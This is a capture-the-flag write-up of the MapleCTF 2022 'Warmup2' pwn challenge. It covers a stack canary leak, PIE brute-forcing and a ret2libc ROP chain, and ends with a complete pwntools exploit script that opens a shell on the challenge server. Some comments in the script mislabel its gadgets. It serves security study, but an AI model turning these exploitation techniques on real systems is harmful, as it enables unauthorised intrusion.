* TOC
{:toc}

This is a writeup about the 2022 MapleCTF challenge `Warmup2`

# Challenge Background

> Author: =)#9593  
> It's like warmup1, but harder.

This challenge was one of the earlier releases in the `pwn` category. It is also one of the simpler challenges of the CTF with 100 solves by the end. We are given the challenge binary `chal` and a netcat command to connect to the service hosting the binary `nc warmup2.ctf.maplebacon.org 1337`.

# Reconnaissance

First I downloaded the challenge binary - `chal` - from the provided link and ran the `file` command to get an idea of what we're dealing with.

![Screenshot 2022-09-02 024425](https://user-images.githubusercontent.com/71113694/188112684-3f1f29e2-9443-4bd5-bf78-aa332c4660fd.png)

This lets us know we're dealing with a x86-64 elf that is dynamically linked, and is *not* stripped, so we have debug symbols. Next, I ran the `checksec` command to see what kind of protections the binary has enabled.

![image](https://user-images.githubusercontent.com/71113694/188113553-0b3a5ddf-15a8-4195-af07-c4bc750eeff4.png)

Unfortunatly for us, all the protections are active, so exploitation will be a bit more difficult than warmup1 (which did not have the stack canary enabled).

Finally, taking a look at the binary in IDA-pro shows that there are two functions that comprise the functionality of the binary, this being `main` and `vuln`. The `main` function is not of particular interest as it only calls some `setbuf` functions on `stdin` and `_bss_start`, additionally an alarm is set for 60 seconds (likely to prevent a connection from hogging resources). This leaves us to look into the aptly named `vuln` function for a vulerability.

# Vulerability

Lets take a look at the IDA-Pro decompolation of the function to get an overview of what's going on.

![image](https://user-images.githubusercontent.com/71113694/188115423-4106a326-7684-4230-a1a1-1cbb7dc6ef62.png)

This function is very simple and exhibits a basic buffer overflow since we have a char buffer of size 0x108 on the stack, while the read functions read 0x1337 bytes. It is also significant that there are not only two reads, but two `printf` statements that will read the string that's contained in our buffer. This means that we not only have the ability to overflow the buffer and hijack the programs control flow, but we also have the ability to leak values off of the stack if we craft the string in `buf` carefully.

Through this, it seems evident that this challenge involves leaking stack information to bypass the stack canary, buffer overflow to hijack control flow, and ROP into a libc system call.

# Leaking the canary

Leaking the canary is simple since we have the `printf` function call with a `%s` format parameter. This means the function will keep printing bytes until a null byte is read. From this we can have it print out the bytes of the stack canary by overflowing the buffer up to the stack canary **plus one byte** (we must do this to overwrite the null byte of the stack canary). 

*As a side note, keep in mind that the stack may have more information on it after the canary, so the stack canary should only be the first 7 bytes after our input is printed out*

This allows us to then read in the processes stack canary from stdout. Thus, we could overflow the buffer, maintain the stack canary, and hijack the control flow - though we have to remember to add the null byte back into the canary!

# Defeating ASLR

To defeat the PIE of the main binary, we have to do a little bit of brute-forcing. This is fine since we only have to brute force a nibble, and what we're looking for is a successful jump to right before `vuln` is called in `main` (aka the address `0x12d8`). We do this by guessing what the upper nibble of the second least significant byte of the address will be (in my case, I guessed `0xe`), then keep running the command until we are correct - which we'll know when we re-enter vuln and get the welcome text.

Once we're in `vuln` again, we can do the same trick as with the canary to leak the saved return address, which we know should be the address after the function call or `0x12e2`. Once we have that, we can then calculate the binaries base address and trivialise any returns that have to be done within it. This will allow us to ROP into leaking the libc base address **and** then jump back into a `vuln` funciton call for our last ROP chain.

# Finding the Libc Base Address

To leak libc I did a simple puts(puts) leak. To do this, I found a ROP gadget that simply did `pop rdi; ret;`. From here, we simply need to get the address of the puts pointer from the GOT into rdi, then jump into the puts PLT function (note: we do NOT want to have a call into puts, as this will put a return address onto the stack, breaking our ROP chain!). From this, we get the address of puts in libc, but we also want to leak another address so we can figure out which libc the binary is using! Thus, I leaked the address of read as well, and with these two, we can use the website https://libc.rip/ to lookup libc files based on symbol locaitons, we can then search the libc to find whatever else we may need, as well as calculate the base address of the libc based off of either the puts or read address.

# ROP into a Shell

For our final ROP we just do a buffer overflow, preserve the canary, jump to a `ret` to realign the for libc (otherwise we'll get a segfault) then pop `/bin/bash` into rdi and call `system` which will get us a root shell! If this all works, then we should be able to easily read the flag within the server from there.

# Final Script
```python3
#!/bin/env python3 
from pwn import *

FILE = "./chal"
elf = ELF(FILE)

BUFFER_SIZE = 0x110
CANARY_OFFSET = -8
DEBUG = True 

PORT = 1337
HOST = "warmup2.ctf.maplebacon.org"

context.arch = "amd64"
context.encoding = "latin"
context.log_level = "debug" if (DEBUG) else "INFO"
warnings.simplefilter("ignore")

run = True 
while (run):
	p: process = process([FILE]) if (DEBUG) else remote(HOST, PORT)

	# Leak canary
	payload = b'A'*(BUFFER_SIZE + CANARY_OFFSET + 1) # +1 to overwrite the nullbyte of canary
	p.send(payload)
	p.recvuntil(payload)
	
	stackLeak = p.recvline(keepends=False)
	canary = b'\x00' + stackLeak[:7]
	
	# Return to main, preserve canary & RBP
	payload = b'A'*(0x110 + CANARY_OFFSET)
	payload += canary
	payload += b'B'*8
	payload += 0xe2d8.to_bytes(2, 'little') # This is our guess of the binary offset
	p.send(payload)
	p.recvuntil(b'too!')
	
	# Try because we could have just segfaulted if we guessed wrong
	try:
		# Get main address
		p.recvuntil(b'What')
		payload = b'A'*(0x110 + CANARY_OFFSET)
		payload += b'C'*8
		payload += b'B'*8
		p.send(payload)
		
		p.recvuntil(payload)
		mainAddress = p.recvline(keepends=False)[:8][:-1]
		mainAddress = int.from_bytes(mainAddress, 'little', signed=False)
		baseAddress = mainAddress - 0x12e2
	
		payload = b'A'*(0x110 + CANARY_OFFSET)
		payload += canary
		payload += b'B'*8

		# Jump to pop rdi; ret;
		payload += p64(baseAddress + 0x1353) # pop rdi; ret
		payload += p64(baseAddress + 0x3FA8) # Address of puts GOT
		payload += p64(baseAddress + 0x10a4) # Jump to puts
		
		# Jump to pop rdi; ret;
		payload += p64(baseAddress + 0x1353) # pop rdi; ret
		payload += p64(baseAddress + 0x3FD0) # Address of read GOT
		payload += p64(baseAddress + 0x10a4) # Jump to puts

		payload += p64(baseAddress + 0x12d8)

		p.send(payload)
		p.recvuntil(b'!\n')
		putsAddr = p.recvline(keepends=False)
		readAddr = p.recvline(keepends=False)

		print(f"[DEBUG] Puts Address: {putsAddr.hex()}")
		print(f"[DEBUG] Read Address: {readAddr.hex()}")

		putsInt = int.from_bytes(putsAddr, 'little', signed=False)
		libcBase = putsInt - 0x84420

		# Ret 2 libc baby!!!!
		# non payload
		p.recvuntil(b'What')
		payload = b'A'*(0x110 + CANARY_OFFSET)
		payload += b'C'*8
		payload += b'B'*8
		p.send(payload)

		# ret 2 libc # call 
		payload = b'A'*(0x110 + CANARY_OFFSET)
		payload += canary
		payload += b'B'*8

		payload += p64(baseAddress + 0x1353) 	# ret to realign
		payload += p64(libcBase + 0x1b45bd) 	# pop rdi; ret
		payload += p64(baseAddress + 0x101a)	# Get address of /bin/sh into rdi
		payload += p64(libcBase + 0x52290)		# Jump into system
		p.send(payload)
		p.interactive()

		run = False
	except:
		pass
	
	p.close()
```
